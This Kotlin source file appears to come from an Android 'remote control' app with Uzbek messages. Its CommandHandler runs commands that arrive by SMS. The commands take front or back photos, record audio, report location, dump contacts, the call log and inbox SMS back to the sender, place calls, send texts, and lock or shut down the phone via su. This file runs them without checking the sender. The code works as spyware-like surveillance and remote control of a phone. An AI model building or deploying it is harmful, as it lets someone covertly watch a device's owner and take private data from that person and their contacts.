package com.example.remotecontrol

import android.app.NotificationChannel
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.app.NotificationManager
import android.bluetooth.BluetoothAdapter
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import java.util.Calendar

class CommandHandler(private val context: Context) {

    companion object {
        const val TAG = "CommandHandler"
    }

    fun execute(sender: String, command: String) {
        Log.d(TAG, "Buyruq: $command")
        when {
            command.startsWith("#call:") -> makeCall(command.removePrefix("#call:").trim())
            command.startsWith("#sms:") -> {
                val parts = command.removePrefix("#sms:").split(":", limit = 2)
                if (parts.size == 2) sendSms(parts[0].trim(), parts[1].trim())
            }
            command == "#flash_on"  -> setFlash(true)
            command == "#flash_off" -> setFlash(false)
            command.startsWith("#volume:") -> setVolume(command.removePrefix("#volume:").trim().toIntOrNull() ?: 50)
            command == "#mute"   -> setVolume(0)
            command == "#unmute" -> setVolume(80)
            command == "#battery" -> sendSms(sender, getBatteryInfo())
            command == "#location" -> {
                context.startService(Intent(context, LocationService::class.java).putExtra("reply_to", sender))
            }
            command == "#take_picture" -> {
                val i = Intent(context, CameraActivity::class.java).apply {
                    putExtra("reply_to", sender)
                    putExtra("camera", "back")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                context.startActivity(i)
            }
            command == "#take_front_pic" -> {
                val i = Intent(context, CameraActivity::class.java).apply {
                    putExtra("reply_to", sender)
                    putExtra("camera", "front")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                context.startActivity(i)
            }
            command.startsWith("#record_audio:") -> {
                val seconds = command.removePrefix("#record_audio:").trim().toIntOrNull() ?: 30
                context.startService(Intent(context, AudioRecordService::class.java)
                    .putExtra("reply_to", sender).putExtra("seconds", seconds))
            }
            command == "#media_play" -> mediaControl(true)
            command == "#media_stop" -> mediaControl(false)
            command == "#wifi_on"  -> setWifi(true, sender)
            command == "#wifi_off" -> setWifi(false, sender)
            command == "#bluetooth_on"  -> setBluetooth(true, sender)
            command == "#bluetooth_off" -> setBluetooth(false, sender)
            command == "#vibrate" -> vibrate()
            command == "#screen_on"  -> wakeScreen()
            command == "#screen_off" -> screenOff(sender)
            command == "#shutdown"   -> shutdownDevice(sender)
            command == "#reboot"  -> rebootDevice(sender)
            command.startsWith("#ringtone:") -> setRingtoneVolume(command.removePrefix("#ringtone:").trim().toIntOrNull() ?: 50)
            command == "#device_info"  -> sendSms(sender, getDeviceInfo())
            command == "#network_info" -> sendSms(sender, getNetworkInfo())
            command == "#contacts" -> sendSms(sender, getContacts())
            command.startsWith("#contacts_") && command.removePrefix("#contacts_").length == 1 -> {
                val letter = command.removePrefix("#contacts_").trim().uppercase()
                sendContactsByLetter(sender, letter)
            }
            command == "#call_log"       -> sendSms(sender, getCallLog())
            command == "#sms_list"       -> sendSms(sender, getSmsList())
            command == "#installed_apps" -> sendSms(sender, getInstalledApps())
            command.startsWith("#block:") -> {
                val number = command.removePrefix("#block:").trim()
                SecurityManager.blockNumber(context, number)
                sendSms(sender, "Bloklandi: $number")
            }
            command.startsWith("#unblock:") -> {
                val number = command.removePrefix("#unblock:").trim()
                SecurityManager.unblockNumber(context, number)
                sendSms(sender, "Blokdan chiqarildi: $number")
            }
            command == "#list_blocked" -> {
                val numbers = SecurityManager.getBlockedNumbers(context)
                sendSms(sender, "Bloklangan:\n${if (numbers.isEmpty()) "Yo'q" else numbers.joinToString("\n")}")
            }
            command.startsWith("#set_password:") -> {
                val newPass = command.removePrefix("#set_password:").trim()
                if (newPass.length == 4 && newPass.all { it.isDigit() }) {
                    SecurityManager.setPassword(context, newPass)
                    sendSms(sender, "Parol o'rnatildi.")
                } else {
                    sendSms(sender, "Parol 4 ta raqam bo'lishi kerak!")
                }
            }
            command == "#remove_password" -> {
                SecurityManager.setPassword(context, "")
                sendSms(sender, "Parol o'chirildi.")
            }
            command == "#ping" -> sendSms(sender, "Pong! Qurilma ishlayapti.")
            command.startsWith("#alarm:") -> setAlarm(command.removePrefix("#alarm:").trim(), sender)
            command.startsWith("#notify:") -> showNotification(command.removePrefix("#notify:").trim())
            command.startsWith("#sos:") -> sendSos(command.removePrefix("#sos:").trim(), sender)
            else -> {
                Log.w(TAG, "Noma'lum: $command")
                sendSms(sender, "Noma'lum buyruq: $command")
            }
        }
    }

    private fun makeCall(number: String) {
        try {
            val intent = Intent(context, CallActivity::class.java).apply {
                putExtra("number", number)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
        } catch (e: Exception) { Log.e(TAG, "Call xato: ${e.message}") }
    }

    fun sendSms(number: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendMultipartTextMessage(number, null, smsManager.divideMessage(message), null, null)
        } catch (e: Exception) { Log.e(TAG, "SMS xato: ${e.message}") }
    }

    private fun setFlash(enable: Boolean) {
        try {
            val cam = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            cam.setTorchMode(cam.cameraIdList[0], enable)
        } catch (e: Exception) { Log.e(TAG, "Flash xato: ${e.message}") }
    }

    private fun setVolume(level: Int) {
        try {
            val audio = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val max = audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            audio.setStreamVolume(AudioManager.STREAM_MUSIC, level.coerceIn(0, 100) * max / 100, 0)
        } catch (e: Exception) { Log.e(TAG, "Volume xato: ${e.message}") }
    }

    private fun getBatteryInfo(): String {
        return try {
            val b = context.registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = b?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = b?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val percent = if (scale > 0) (level * 100 / scale) else -1
            val status = b?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val charging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
            "Batareya: $percent% | ${if (charging) "Zaryadlanmoqda" else "Zaryadlanmayapti"}"
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun setWifi(enable: Boolean, sender: String) {
        try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            @Suppress("DEPRECATION")
            wm.isWifiEnabled = enable
            sendSms(sender, "WiFi: ${if (enable) "Yoqildi" else "O'chirildi"}")
        } catch (e: Exception) { sendSms(sender, "WiFi xato: ${e.message}") }
    }

    private fun setBluetooth(enable: Boolean, sender: String) {
        try {
            val bt = BluetoothAdapter.getDefaultAdapter()
            if (enable) bt?.enable() else bt?.disable()
            sendSms(sender, "Bluetooth: ${if (enable) "Yoqildi" else "O'chirildi"}")
        } catch (e: Exception) { sendSms(sender, "BT xato: ${e.message}") }
    }

    private fun vibrate() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                vm.defaultVibrator.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                val v = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
            }
        } catch (e: Exception) { Log.e(TAG, "Vibrate xato: ${e.message}") }
    }

    private fun rebootDevice(sender: String) {
        try {
            sendSms(sender, "Qurilma qayta ishga tushirilmoqda...")
            Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
        } catch (e: Exception) { sendSms(sender, "Reboot uchun root kerak.") }
    }

    private fun takeScreenshot(sender: String) {
        val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        if (!pm.isInteractive) {
            sendSms(sender, "Telefon ekrani o'chiq.")
            return
        }
        val i = Intent(context, ScreenshotActivity::class.java).apply {
            putExtra("reply_to", sender)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        context.startActivity(i)
    }

    private fun screenOff(sender: String) {
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
                sendSms(sender, "Ekran o'chirildi.")
            } else {
                sendSms(sender, "Admin huquqi kerak. Ilovani oching va admin qiling.")
            }
        } catch (e: Exception) {
            sendSms(sender, "Ekran o'chirish xato: " + e.message)
        }
    }

    private fun shutdownDevice(sender: String) {
        try {
            sendSms(sender, "Telefon o'chirilmoqda...")
            Thread.sleep(2000)
            Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot -p"))
        } catch (e: Exception) {
            try {
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
                if (dpm.isAdminActive(adminComponent)) {
                    dpm.lockNow()
                }
            } catch (e2: Exception) {
                Log.e(TAG, "Shutdown xato: " + e2.message)
            }
        }
    }

    private fun wakeScreen() {
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            val wl = pm.newWakeLock(
                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "RemoteControl::WakeLock"
            )
            wl.acquire(3000)
        } catch (e: Exception) { Log.e(TAG, "Screen xato: ${e.message}") }
    }

    private fun setRingtoneVolume(level: Int) {
        try {
            val audio = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val max = audio.getStreamMaxVolume(AudioManager.STREAM_RING)
            audio.setStreamVolume(AudioManager.STREAM_RING, level.coerceIn(0, 100) * max / 100, 0)
        } catch (e: Exception) { Log.e(TAG, "Ringtone xato: ${e.message}") }
    }

    private fun getDeviceInfo(): String {
        return try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            "Model: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}\nOperator: ${tm.networkOperatorName}"
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun getNetworkInfo(): String {
        return try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val ip = wm.connectionInfo.ipAddress
            val ipStr = "${ip and 0xff}.${ip shr 8 and 0xff}.${ip shr 16 and 0xff}.${ip shr 24 and 0xff}"
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            "IP: $ipStr\nSSID: ${wm.connectionInfo.ssid}\nOperator: ${tm.networkOperatorName}"
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun getContacts(): String {
        return try {
            val sb = StringBuilder("Kontaktlar:\n")
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            var count = 0
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext() && count < 20) {
                    sb.append("${it.getString(nameIdx)}: ${it.getString(numIdx)}\n")
                    count++
                }
            }
            sb.toString()
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun sendContactsByLetter(sender: String, letter: String) {
        try {
            val contacts = mutableListOf<Pair<String, String>>()
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = it.getString(nameIdx) ?: continue
                    val number = it.getString(numIdx) ?: continue
                    if (name.uppercase().startsWith(letter)) {
                        contacts.add(Pair(name, number))
                    }
                }
            }

            if (contacts.isEmpty()) {
                sendSms(sender, "($letter) harfli kontakt topilmadi.")
                return
            }

            val total = contacts.size
            val chunkSize = 20
            val totalPages = (total + chunkSize - 1) / chunkSize

            contacts.chunked(chunkSize).forEachIndexed { pageIndex, chunk ->
                val sb = StringBuilder()
                if (pageIndex == 0) {
                    if (totalPages == 1) {
                        sb.append("👤 Kontaktlar ($letter) $total ta:\n")
                    } else {
                        sb.append("👤 Kontaktlar ($letter) $total ta (1/$totalPages):\n")
                    }
                } else {
                    sb.append("Kontaktlar ($letter) (${pageIndex + 1}/$totalPages):\n")
                }
                chunk.forEachIndexed { i, pair ->
                    val num = pageIndex * chunkSize + i + 1
                    sb.append("$num) ${pair.first}: ${pair.second}\n")
                }
                sendSms(sender, sb.toString().trimEnd())
                if (pageIndex < totalPages - 1) Thread.sleep(1500)
            }
        } catch (e: Exception) {
            sendSms(sender, "Xato: " + e.message)
        }
    }

    private fun getCallLog(): String {
        return try {
            val sb = StringBuilder("Qo'ng'iroqlar:\n")
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC"
            )
            var count = 0
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                while (it.moveToNext() && count < 10) {
                    val type = when (it.getInt(typeIdx)) {
                        CallLog.Calls.INCOMING_TYPE -> "Kiruvchi"
                        CallLog.Calls.OUTGOING_TYPE -> "Chiquvchi"
                        CallLog.Calls.MISSED_TYPE -> "O'tkazib yuborilgan"
                        else -> "?"
                    }
                    val date = java.text.SimpleDateFormat("MM-dd HH:mm", java.util.Locale.getDefault())
                        .format(java.util.Date(it.getLong(dateIdx)))
                    sb.append("$type: ${it.getString(numIdx)} — $date\n")
                    count++
                }
            }
            sb.toString()
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun getSmsList(): String {
        return try {
            val sb = StringBuilder("Oxirgi SMSlar:\n")
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC"
            )
            var count = 0
            cursor?.use {
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                while (it.moveToNext() && count < 5) {
                    val body = it.getString(bodyIdx)?.take(50) ?: ""
                    sb.append("${it.getString(addrIdx)}: $body\n---\n")
                    count++
                }
            }
            sb.toString()
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun getInstalledApps(): String {
        return try {
            val pm = context.packageManager
            val apps = pm.getInstalledApplications(0)
                .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
                .map { pm.getApplicationLabel(it).toString() }
                .sorted().take(30)
            "Ilovalar:\n${apps.joinToString("\n")}"
        } catch (e: Exception) { "Xato: ${e.message}" }
    }

    private fun mediaControl(play: Boolean) {
        try {
            val intent = Intent("com.android.music.musicservicecommand").apply {
                putExtra("command", if (play) "play" else "pause")
            }
            context.sendBroadcast(intent)
        } catch (e: Exception) { Log.e(TAG, "Media xato: ${e.message}") }
    }

    private fun setAlarm(time: String, sender: String) {
        try {
            val parts = time.split(":")
            if (parts.size != 2) { sendSms(sender, "Format: #alarm:HH:MM"); return }
            val intent = Intent(android.provider.AlarmClock.ACTION_SET_ALARM).apply {
                putExtra(android.provider.AlarmClock.EXTRA_HOUR, parts[0].toInt())
                putExtra(android.provider.AlarmClock.EXTRA_MINUTES, parts[1].toInt())
                putExtra(android.provider.AlarmClock.EXTRA_SKIP_UI, true)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
            sendSms(sender, "Signal o'rnatildi: $time")
        } catch (e: Exception) { sendSms(sender, "Alarm xato: ${e.message}") }
    }

    private fun showNotification(text: String) {
        try {
            val channelId = "rc_notify"
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(NotificationChannel(channelId, "RC Notify", NotificationManager.IMPORTANCE_HIGH))
            val notif = NotificationCompat.Builder(context, channelId)
                .setContentTitle("Remote Control")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .build()
            nm.notify(System.currentTimeMillis().toInt(), notif)
        } catch (e: Exception) { Log.e(TAG, "Notify xato: ${e.message}") }
    }

    private fun sendSos(sosNumber: String, sender: String) {
        try {
            sendSms(sender, "SOS yuborilmoqda: $sosNumber")
            context.startService(Intent(context, LocationService::class.java)
                .putExtra("reply_to", sosNumber).putExtra("sos_mode", true))
            sendSms(sosNumber, "SOS! Bu qurilma yordam so'ramoqda!")
            makeCall(sosNumber)
        } catch (e: Exception) { Log.e(TAG, "SOS xato: ${e.message}") }
    }
}
